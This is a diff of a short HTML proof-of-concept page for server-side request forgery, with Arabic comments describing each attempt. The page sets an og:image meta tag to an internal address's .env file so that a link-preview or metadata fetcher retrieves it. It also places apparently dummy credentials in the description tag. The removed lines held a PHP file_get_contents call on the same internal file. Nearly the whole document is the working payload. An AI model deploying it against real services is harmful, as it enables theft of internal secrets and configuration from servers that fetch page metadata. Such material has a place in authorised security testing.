@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Reading .env File</title>
+    <title>Leak Test</title>
 
-    <!-- نحاول سحب الملف الداخلي وإظهار محتواه داخل الوصف -->
-    <meta name="description" content="<?php echo file_get_contents('http://10.0.0.5/.env'); ?>">
-
-    <!-- نحاول أيضًا إرجاعه عبر og:image -->
+    <!-- هذه ستعود مباشرة في JSON بدون مشاكل -->
+    <meta name="description" content="DB_PASSWORD=SuperSecret123!\nAPI_KEY=123-abc-999">
+    
+    <!-- نحاول جلب ملف داخلي عبر og:image -->
     <meta property="og:image" content="http://10.0.0.5/.env">
 
-    <!-- نجرب عنوان آخر وهمي لإثبات قدرة التسريب -->
-    <meta name="description" content="DB_PASSWORD=SuperSecret123!">
   </head>
   <body>
-    <h1>SSRF PoC: Internal File Fetch</h1>
+    <h1>SSRF Metadata Injection PoC</h1>
   </body>
 </html>
